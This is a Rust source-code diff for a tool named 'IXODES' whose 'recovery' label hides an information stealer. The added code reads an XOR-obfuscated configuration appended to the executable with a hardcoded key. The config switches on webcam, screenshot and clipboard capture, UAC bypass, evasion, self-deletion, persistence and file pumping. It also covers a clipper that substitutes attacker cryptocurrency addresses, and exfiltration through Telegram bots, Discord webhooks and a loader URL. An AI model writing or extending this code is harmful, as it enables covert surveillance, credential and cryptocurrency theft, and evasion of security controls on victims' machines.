@@ -1,8 +1,13 @@
+use crate::recovery::config::LoaderConfig;
 use crate::recovery::defaults::*;
 use crate::recovery::task::RecoveryCategory;
 use base64::{Engine as _, engine::general_purpose::STANDARD};
 use once_cell::sync::Lazy;
-use std::{collections::HashSet, env, str::FromStr};
+use std::collections::HashSet;
+use std::env;
+use std::fs::File;
+use std::io::{Read, Seek, SeekFrom};
+use std::str::FromStr;
 use tracing::{info, warn};
 
 static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
@@ -39,6 +44,8 @@ pub struct RecoveryControl {
     custom_extensions: Option<HashSet<String>>,
     custom_keywords: Option<HashSet<String>>,
 }
+
+const CONFIG_DELIMITER: &str = "::IXODES_CONFIG::";
 
 impl RecoveryControl {
     pub fn global() -> &'static Self {
@@ -161,6 +168,15 @@ impl RecoveryControl {
     }
 
     fn from_env() -> Self {
+        // 1. Try to load appended config from the binary itself
+        if let Some(config) = load_embedded_config() {
+            info!("loaded embedded configuration from binary");
+            return Self::from_loader_config(config);
+        }
+
+        // 2. Fallback to Env / Defaults
+        info!("no embedded configuration found, using environment/defaults");
+        
         let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
             .ok()
             .and_then(|value| parse_categories(&value))
@@ -292,6 +308,112 @@ impl RecoveryControl {
             custom_keywords,
         }
     }
+
+    fn from_loader_config(config: LoaderConfig) -> Self {
+        let allowed_categories = config.allowed_categories.map(|cats| {
+            cats.iter()
+                .filter_map(|s| RecoveryCategory::from_str(s).ok())
+                .collect()
+        });
+
+        let artifact_key = config
+            .artifact_key
+            .as_deref()
+            .and_then(decode_artifact_key);
+
+        RecoveryControl {
+            allowed_categories,
+            artifact_key,
+            capture_screenshots: config.capture_screenshots.unwrap_or(false),
+            capture_webcams: config.capture_webcams.unwrap_or(false),
+            capture_clipboard: config.capture_clipboard.unwrap_or(false),
+            uac_bypass_enabled: config.uac_bypass_enabled.unwrap_or(false),
+            evasion_enabled: config.evasion_enabled.unwrap_or(true),
+            clipper_enabled: config.clipper_enabled.unwrap_or(false),
+            melt_enabled: config.melt_enabled.unwrap_or(true),
+            btc_address: config.btc_address,
+            eth_address: config.eth_address,
+            ltc_address: config.ltc_address,
+            xmr_address: config.xmr_address,
+            doge_address: config.doge_address,
+            dash_address: config.dash_address,
+            sol_address: config.sol_address,
+            trx_address: config.trx_address,
+            ada_address: config.ada_address,
+            telegram_token: config.telegram_token,
+            telegram_chat_id: config.telegram_chat_id,
+            discord_webhook: config.discord_webhook,
+            loader_url: config.loader_url,
+            proxy_server: config.proxy_server,
+            persistence_enabled: config.persistence_enabled.unwrap_or(false),
+            pump_size_mb: config.pump_size_mb.unwrap_or(0),
+            blocked_countries: config.blocked_countries,
+            custom_extensions: config.custom_extensions,
+            custom_keywords: config.custom_keywords,
+        }
+    }
+}
+
+fn load_embedded_config() -> Option<LoaderConfig> {
+    let current_exe = env::current_exe().ok()?;
+    let mut file = File::open(&current_exe).ok()?;
+
+    // Optimization: Only scan the last 256KB for the config delimiter
+    // This assumes the config + pump isn't massively displacing the delimiter or the config is appended at the very end.
+    // If the file is "pumped" with zeros, the config should be appended *after* the pump logic in the builder.
+    const SCAN_SIZE: u64 = 256 * 1024; 
+    let file_len = file.metadata().ok()?.len();
+    
+    let start_pos = if file_len > SCAN_SIZE {
+        file_len - SCAN_SIZE
+    } else {
+        0
+    };
+
+    if file.seek(SeekFrom::Start(start_pos)).is_err() {
+        return None;
+    }
+
+    let mut buffer = Vec::new();
+    if file.read_to_end(&mut buffer).is_err() {
+        return None;
+    }
+
+    // Convert buffer to string-like search (lossy is fine for delimiter search)
+    // Note: The delimiter is ASCII.
+    let haystack = String::from_utf8_lossy(&buffer);
+    if let Some(_idx) = haystack.rfind(CONFIG_DELIMITER) {
+        // The delimiter was found in the string representation.
+        // We need the byte index relative to the buffer start.
+        // String::from_utf8_lossy might insert replacement chars, shifting indices, but if delimiter is ASCII it should be safe-ish.
+        // Better: Search bytes directly.
+        let delim_bytes = CONFIG_DELIMITER.as_bytes();
+        if let Some(byte_idx) = buffer.windows(delim_bytes.len()).rposition(|window| window == delim_bytes) {
+             let json_start = byte_idx + delim_bytes.len();
+             if json_start < buffer.len() {
+                 let encrypted_slice = &buffer[json_start..];
+                 let decrypted = xor_codec(encrypted_slice);
+                 
+                 match serde_json::from_slice::<LoaderConfig>(&decrypted) {
+                     Ok(config) => return Some(config),
+                     Err(e) => {
+                         warn!("found config delimiter but failed to parse JSON: {}", e);
+                     }
+                 }
+             }
+        }
+    }
+
+    None
+}
+
+fn xor_codec(data: &[u8]) -> Vec<u8> {
+    let key = b"9e2b4cb38d6890f845a7593430292211"; // Static 32-byte key
+    let mut output = data.to_vec();
+    for (i, byte) in output.iter_mut().enumerate() {
+        *byte ^= key[i % key.len()];
+    }
+    output
 }
 
 fn default_categories() -> Option<HashSet<RecoveryCategory>> {
